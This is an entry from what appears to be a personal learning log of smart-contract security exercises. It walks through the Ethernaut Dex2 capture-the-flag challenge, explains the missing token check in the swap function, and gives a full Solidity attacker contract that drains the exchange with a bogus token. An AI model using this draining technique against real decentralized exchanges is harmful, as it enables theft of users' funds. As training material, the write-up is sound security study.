## Day 21

### Ethernaut #23 Dex2

This is a similar to an exercise we did using Echidna, also an Ethernaut challenge called Dex.  The main contract DexTwo is a DEX or decentralized exhcnage.  The problem with the first challenge was in the ```getSwapAmount()``` method, so let's compare those from the two challenges.

```Java
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  } 

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }
```

Let's take a look at this function in the previous challenge: 

```Java
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }
```

The first challenge has an extra require statement: 

```Java
require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

Without this staement we should be able to trade any tokens we want.  We will create a bogus coin, mint all the supply to ourselves and use this to drain the DEX.  Code to accomplish this is below.  

```Java
  contract Attacker{
      DexTwo immutable public dex;
      SwappableTokenTwo immutable junkcoin;
      address public token1;
      address public token2;

      constructor(address _dexAdd){
        dex = DexTwo(_dexAdd);
        junkcoin = new SwappableTokenTwo(_dexAdd, "junkcoin", "Junk", 1_000_000);
      }

      function attack() external {
        token1 = dex.token1();
        token2 = dex.token2();

        // add liquidity, so that DEx junkcoin balance is nonzero, we can't use dex.addLiqudity()
        junkcoin.transfer(address(dex), 100);

        // empty first coin
        junkcoin.approve(address(this), address(dex), 100);
        dex.swap(address(junkcoin), address(token1), 100);

        // now Dex has 200 junkcoins and 100 token2, so the swap ratio will be 1/2
        junkcoin.approve(address(this), address(dex), 200);
        dex.swap(address(junkcoin), address(token2), 200);
      }
  }
```

A few details should be metnioned.  We first create a new ERC20 token and mint some supply.  The minimum we need is 400 tokens. After the tokens are minted we need to transfer 100 tokens to the DEX. If we don't then we will get a divide by 0 error during ```getSwapAmount()```.   The DEX ```.addliquitidy()``` method cannot be used becuase it has the ```onlyOwner()``` modifier.  We will use the token's ```.tranfer()``` instead.  After this we can do a one for one swap for token1, then the DEX will have a balance of 200 junkcoins and we will need to send 200 junkcoins for 100 token2.  

### Ethernaut #17

### Damn Vulnerable DeFi #2 Naive Receiver

